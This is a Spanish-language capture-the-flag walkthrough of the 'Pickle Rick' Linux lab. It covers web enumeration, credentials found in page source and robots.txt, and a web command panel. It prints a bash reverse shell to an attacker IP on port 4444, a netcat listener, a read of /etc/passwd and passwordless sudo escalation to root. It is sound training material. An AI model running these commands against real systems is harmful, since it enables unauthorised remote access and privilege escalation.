# Pickle Rick

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux obteniendo acceso a una consola web vulnerable, generar una **reverse shell**, realizar una enumeración del sistema y recuperar los tres ingredientes necesarios para que Rick complete su experimento.

---

## 🛠️ Tecnologías trabajadas

- Gobuster
- Burp Suite
- Reverse Shell
- Netcat
- Bash
- Sudo
- Web Command Execution

---

## 🧠 Metodología

La enumeración inicial mostró únicamente dos servicios expuestos: **SSH** y **HTTP**. Debido a que el acceso por SSH requería credenciales, toda la investigación se centró inicialmente en la aplicación web.

Durante la exploración encontré varias pistas repartidas entre el código fuente y distintos recursos accesibles mediante la web. En lugar de intentar realizar fuerza bruta desde el principio, decidí recopilar toda la información disponible antes de autenticarme. Esta estrategia permitió obtener tanto el nombre de usuario como la contraseña sin necesidad de realizar ataques adicionales.

Tras acceder al panel de administración observé que existía una funcionalidad que permitía ejecutar comandos directamente sobre el servidor. En lugar de utilizarla únicamente para realizar tareas básicas, la aproveché para generar una **reverse shell** y obtener una sesión interactiva mucho más cómoda para continuar la auditoría.

Una vez dentro del sistema, la enumeración consistió principalmente en localizar archivos interesantes y revisar los privilegios disponibles. La máquina estaba diseñada para facilitar la escalada mediante una configuración insegura de **sudo**, por lo que fue posible obtener acceso como **root** sin necesidad de explotar vulnerabilidades adicionales.

Este laboratorio pone de manifiesto cómo una aplicación web con información expuesta y una mala configuración de privilegios pueden comprometer completamente un sistema.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé comprobando la conectividad con la máquina mediante `ping` y confirmé que se trataba de un sistema Linux gracias al TTL obtenido.

Posteriormente realicé un escaneo completo utilizando Nmap.

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 10.10.0.53
```

Se identificaron los siguientes servicios:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |

---

### 2. Enumeración web

Al acceder a la página principal revisé el código fuente y encontré el siguiente usuario:

```
R1ckRul3s
```

A continuación realicé una enumeración de directorios mediante Gobuster.

```bash
gobuster dir -u http://10.10.0.53 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Los recursos más interesantes fueron:

- `/assets`
- `/login.php`
- `/robots.txt`

Dentro de `robots.txt` encontré la siguiente cadena:

```
Wubbalubbadubdub
```

Tras probarla comprobé que correspondía a la contraseña del usuario descubierto anteriormente.

---

### 3. Acceso al panel

Con las credenciales obtenidas inicié sesión en:

```
/login.php
```

El panel de administración incluía una funcionalidad para ejecutar comandos directamente sobre el servidor.

En lugar de utilizarla únicamente para realizar pruebas, ejecuté una **reverse shell**.

```bash
bash -i >& /dev/tcp/10.23.88.247/4444 0>&1
```

En mi máquina atacante preparé un listener mediante Netcat.

```bash
nc -lvnp 4444
```

La conexión se estableció correctamente y obtuve acceso al servidor.

---

### 4. Acceso inicial

Tras recibir la reverse shell realicé el tratamiento habitual de la TTY para trabajar con una consola completamente interactiva.

```bash
script /dev/null -c bash
```

Posteriormente configuré correctamente el terminal.

```bash
stty raw -echo
reset xterm
export TERM=xterm
export SHELL=bash
```

El usuario comprometido era:

```
www-data
```

---

### 5. Enumeración interna

Durante la exploración del sistema encontré el primer ingrediente en el directorio actual.

Posteriormente revisé los usuarios existentes.

```bash
cat /etc/passwd
```

Los directorios personales mostraban dos usuarios interesantes:

- ubuntu
- rick

Dentro del directorio personal de **rick** encontré el segundo ingrediente necesario para completar el laboratorio.

---

### 6. Escalada de privilegios

Comprobé los permisos disponibles mediante:

```bash
sudo -l
```

El resultado indicaba que era posible ejecutar comandos como **root** sin necesidad de introducir contraseña.

Gracias a esta configuración obtuve acceso al usuario **root** y accedí al directorio:

```
/root
```

Allí recuperé el tercer y último ingrediente.

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una cadena de explotación sencilla basada principalmente en una correcta enumeración de la aplicación web y una mala configuración de privilegios.
- Localizar información sensible revisando el código fuente de una página web.
- Utilizar Gobuster para descubrir recursos ocultos.
- Obtener credenciales revisando archivos públicos como `robots.txt`.
- Aprovechar paneles con ejecución remota de comandos para obtener una reverse shell.
- Estabilizar una shell interactiva en Linux.
- Enumerar usuarios y directorios del sistema tras obtener acceso inicial.
- Revisar configuraciones inseguras de `sudo` para conseguir privilegios elevados.
